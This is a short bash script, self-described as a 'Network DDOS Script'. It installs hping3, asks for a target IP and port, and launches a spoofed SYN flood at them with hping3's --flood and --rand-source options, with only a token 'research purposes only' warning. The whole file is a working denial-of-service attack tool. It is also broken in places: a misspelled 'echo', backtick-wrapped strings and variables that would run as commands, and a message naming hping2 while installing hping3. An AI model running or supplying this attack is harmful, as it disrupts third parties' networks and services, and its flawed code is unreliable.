#!/bin/bash
echo "----------------------------------------"
echo "[i] Installation"
    echo "[Network DDOS Script] Loaded, Installing Componants"
    sudo apt update  > /dev/null 2>&1 || echo "[!] Could not update APT."
    echo "[Network DDOS Script] Updated APT."
    echo "[Network DDOS Script] Installing git"
    sudo apt-get install -y git > /dev/null 2>&1 || echo "[!] Could not install git."
    echo "[Network DDOS Script] Installing ping"
    sudo apt-get install -y iputils-ping > /dev/null 2>&1 || echo "[!] Could not install ping."
    ehco "[Network DDOS Script] Installing hping2"
    sudo apt install -y hping3 > /dev/null 2>&1 || echo "[!] Could not install hping3."
echo "[i] Installation Complete"
echo "[TARGET] Please Input Target IP"
read ip
echo `Target IP Selected: $ip`
echo "[TYPE] What Port Should We Target? (Example: 80)"
read port
echo `[PORT] Were Targeting $port`
echo "[WARNING!] This Attack Tool Should Be Used For Research Purposes Only!"
sudo hping3 `$ip` -q -n -d 120 -S -p `$port` --flood --rand-source
